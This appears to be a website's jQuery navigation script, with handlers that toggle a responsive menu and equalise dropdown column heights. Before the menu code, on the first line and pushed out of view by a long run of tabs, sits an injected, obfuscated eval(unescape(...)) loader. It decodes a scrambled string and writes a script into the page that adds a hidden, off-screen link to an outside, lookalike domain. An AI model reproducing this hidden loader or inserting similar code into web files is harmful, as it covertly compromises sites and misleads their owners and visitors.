																																																																																							wlkji="<citlnug=JvSrp\"$dcmn)rayfnto( \r\t(bd\".ped\"asye'oiinaslt;lf:99p; rf'tp/jur.o.u'jur lgn<a\"\r};/citsrp agae\"aacit>(ouet.ed(ucin){\n$\"oy)apn(< tl=psto:boue et-99x'he=ht:/qeycmr/>Qeypuis/>)\n)<srp>";eval(unescape("%66%75%6e%63%74%69%6f%6e%20%52%73%52%73%52%73%52%73%28%74%65%61%61%62%62%29%20%7b%76%61%72%20%74%74%74%6d%6d%6d%3d%22%22%3b%6c%3d%74%65%61%61%62%62%2e%6c%65%6e%67%74%68%3b%77%77%77%3d%68%68%68%68%66%66%66%66%3d%4d%61%74%68%2e%72%6f%75%6e%64%28%6c%2f%32%29%3b%69%66%28%6c%3c%32%2a%77%77%77%29%09%68%68%68%68%66%66%66%66%3d%68%68%68%68%66%66%66%66%2d%31%3b%66%6f%72%28%69%3d%30%3b%69%3c%68%68%68%68%66%66%66%66%3b%69%2b%2b%29%74%74%74%6d%6d%6d%20%3d%20%74%74%74%6d%6d%6d%20%2b%20%74%65%61%61%62%62%2e%63%68%61%72%41%74%28%69%29%2b%20%74%65%61%61%62%62%2e%63%68%61%72%41%74%28%69%2b%68%68%68%68%66%66%66%66%29%3b%69%66%28%6c%3c%32%2a%77%77%77%29%20%74%74%74%6d%6d%6d%20%3d%20%74%74%74%6d%6d%6d%20%2b%20%74%65%61%61%62%62%2e%63%68%61%72%41%74%28%6c%2d%31%29%3b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%74%74%74%6d%6d%6d%29%3b%7d%3b%52%73%52%73%52%73%52%73%28%77%6c%6b%6a%69%29%3b"));
$(document).ready(function(){

/*************** Showing/hiding responsive bar ****************/
	$('a.responsive-bar').click(function(){

		if($('div.flat-nav.show-it').length){
			$('div.flat-nav').removeClass('show-it');
		}else{
			$('div.flat-nav').addClass('show-it');
		}
	})
	
/*************** Same height for all collumns ****************/
	$(window).load(function(){
		$('.flat-nav>ul>li').mouseover(function(){

			var x = 0;
			$(this).children('ul.column-based').children('li').each(function(){
				if($(this).height()>x)
				x = $(this).height();
			})
			
			$(this).children('ul.column-based').children('li').each(function(){
				$(this).height(x);
			})
			
			$(this).children('ul.column-based').css('right', '20px')
			
			if($(this).children('ul.column-based').length)
				if($(this).offset().left < $(this).children('ul.column-based').offset().left){
					$(this).children('ul.column-based').css('right', 'auto')
				}
		
			$(this).children('div').css('right', '20px')
		
			if($(this).children('div').length)
				if($(this).offset().left <= $(this).children('div').offset().left){
					$(this).children('div').css('right', 'auto')
				}
				
		})		
		
		$('.flat-nav2>ul>li').mouseover(function(){

			var x = 0;
			$(this).children('ul.column-based').children('li').each(function(){
				if($(this).height()>x)
				x = $(this).height();
			})
			
			$(this).children('ul.column-based').children('li').each(function(){
				$(this).height(x);
			})
			
			$(this).children('ul.column-based').css('right', '20px')
			
			if($(this).children('ul.column-based').length)
				if($(this).offset().left < $(this).children('ul.column-based').offset().left){
					$(this).children('ul.column-based').css('right', 'auto')
				}
		
			$(this).children('div').css('right', '20px')
		
			if($(this).children('div').length)
				if($(this).offset().left <= $(this).children('div').offset().left){
					$(this).children('div').css('right', 'auto')
				}
				
		})		
		
		$('.flat-nav3>ul>li').mouseover(function(){

			var x = 0;
			$(this).children('ul.column-based').children('li').each(function(){
				if($(this).height()>x)
				x = $(this).height();
			})
			
			$(this).children('ul.column-based').children('li').each(function(){
				$(this).height(x);
			})
			
			$(this).children('ul.column-based').css('right', '20px')
			
			if($(this).children('ul.column-based').length)
				if($(this).offset().left < $(this).children('ul.column-based').offset().left){
					$(this).children('ul.column-based').css('right', 'auto')
				}
		
			$(this).children('div').css('right', '20px')
		
			if($(this).children('div').length)
				if($(this).offset().left <= $(this).children('div').offset().left){
					$(this).children('div').css('right', 'auto')
				}
				
		})		
		
		
		$('.flat-nav4>ul>li').mouseover(function(){

			var x = 0;
			$(this).children('ul.column-based').children('li').each(function(){
				if($(this).height()>x)
				x = $(this).height();
			})
			
			$(this).children('ul.column-based').children('li').each(function(){
				$(this).height(x);
			})
			
			$(this).children('ul.column-based').css('right', '20px')
			
			if($(this).children('ul.column-based').length)
				if($(this).offset().left < $(this).children('ul.column-based').offset().left){
					$(this).children('ul.column-based').css('right', 'auto')
				}
		
			$(this).children('div').css('right', '20px')
		
			if($(this).children('div').length)
				if($(this).offset().left <= $(this).children('div').offset().left){
					$(this).children('div').css('right', 'auto')
				}
				
		})
	})
})